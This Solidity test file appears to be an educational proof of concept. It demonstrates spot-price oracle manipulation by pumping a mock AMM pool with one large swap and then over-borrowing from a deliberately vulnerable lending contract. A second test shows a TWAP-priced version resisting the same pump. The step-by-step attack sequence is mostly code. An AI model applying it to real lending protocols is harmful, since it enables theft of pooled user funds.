// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestHelper} from "./TestHelper.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {SimpleAMM} from "../src/oracle-manipulation/SimpleAMM.sol";
import {VulnerableLending} from "../src/oracle-manipulation/VulnerableLending.sol";
import {FixedLending} from "../src/oracle-manipulation/FixedLending.sol";

/// @notice PoC: spot-price oracle manipulation.
///         Pool starts at 1 A = 1 B with 100_000 of each. The attacker holds
///         10_000 A and 90_000 B. One swap of 90_000 B into the pool pumps
///         A's spot price ~3.6x; the vulnerable market then lets the
///         attacker borrow far more B than the collateral is honestly
///         worth, and the lending pool is left holding the bag.
///         The TWAP-priced market shrugs the same pump off.
contract OracleManipulationTest is TestHelper {
    address internal attacker = address(0xA77AC);
    address internal lp = address(0xCAFE);

    struct Market {
        MockERC20 a;
        MockERC20 b;
        SimpleAMM pool;
    }

    function _setup() internal returns (Market memory m) {
        m.a = new MockERC20("Token A", "A");
        m.b = new MockERC20("Token B", "B");
        m.pool = new SimpleAMM(m.a, m.b);

        // Seed the pool at 1 A = 1 B.
        m.a.mint(lp, 100_000 ether);
        m.b.mint(lp, 100_000 ether);
        vm.prank(lp);
        m.a.approve(address(m.pool), type(uint256).max);
        vm.prank(lp);
        m.b.approve(address(m.pool), type(uint256).max);
        vm.prank(lp);
        m.pool.addLiquidity(100_000 ether, 100_000 ether);

        // Attacker capital.
        m.a.mint(attacker, 10_000 ether);
        m.b.mint(attacker, 90_000 ether);
    }

    function _fundLending(MockERC20 b, address lending) internal {
        b.mint(lending, 500_000 ether);
    }

    function test_vulnerable_lending_spot_pump_borrows_against_fake_price() public {
        Market memory m = _setup();
        VulnerableLending lending = new VulnerableLending(m.a, m.b, m.pool);
        _fundLending(m.b, address(lending));

        // Honest capacity first: 10_000 A at price 1, 80% LTV = 8_000 B.
        vm.prank(attacker);
        m.a.approve(address(m.pool), type(uint256).max);
        vm.prank(attacker);
        m.b.approve(address(m.pool), type(uint256).max);

        // Pump: 90_000 B in, A comes out, spot price of A jumps.
        vm.prank(attacker);
        uint256 aOut = m.pool.swapBforA(90_000 ether);
        uint256 pumpedPrice = m.pool.spotPriceAinB();
        assertGt(pumpedPrice, 3 ether, "spot price pumped past 3x");

        // Deposit the A received from the pump as collateral and borrow
        // against the bent price.
        vm.prank(attacker);
        m.a.approve(address(lending), type(uint256).max);
        vm.prank(attacker);
        lending.depositCollateral(aOut);
        uint256 maxBorrow = (aOut * pumpedPrice / 1e18) * 8000 / 10_000;
        vm.prank(attacker);
        lending.borrow(maxBorrow);

        uint256 attackerB = m.b.balanceOf(attacker);
        // Attacker put 90_000 B in and pulls more than that back out as a
        // "loan" — profit locked in even before unwinding the A position.
        assertGt(attackerB, 90_000 ether, "borrowed more than the pump cost");
        assertGt(lending.debtOf(attacker), 8_000 ether * 4, "debt far above honest capacity");
    }

    function test_fixed_lending_twap_ignores_the_pump() public {
        Market memory m = _setup();
        FixedLending lending = new FixedLending(m.a, m.b, m.pool);
        _fundLending(m.b, address(lending));

        // Honest price history: 20 observations at 1 A = 1 B.
        for (uint256 i = 0; i < 20; i++) {
            lending.observe();
        }

        vm.prank(attacker);
        m.b.approve(address(m.pool), type(uint256).max);
        vm.prank(attacker);
        uint256 aOut = m.pool.swapBforA(90_000 ether);
        assertGt(m.pool.spotPriceAinB(), 3 ether, "spot still pumped");

        // TWAP barely notices one bent observation window.
        uint256 twap = lending.twapPriceAinB();
        assertTrue(twap < 1.1 ether, "twap stayed near the honest price");

        vm.prank(attacker);
        m.a.approve(address(lending), type(uint256).max);
        vm.prank(attacker);
        lending.depositCollateral(aOut);

        // Borrowing the pumped amount now reverts; only the honest amount works.
        uint256 pumpedBorrow = (aOut * m.pool.spotPriceAinB() / 1e18) * 8000 / 10_000;
        vm.prank(attacker);
        try lending.borrow(pumpedBorrow) {
            revert("pumped borrow should have reverted");
        } catch {}

        uint256 honestBorrow = (aOut * twap / 1e18) * 8000 / 10_000;
        vm.prank(attacker);
        lending.borrow(honestBorrow);
        assertEq(lending.debtOf(attacker), honestBorrow, "borrowed at the twap price only");
    }
}
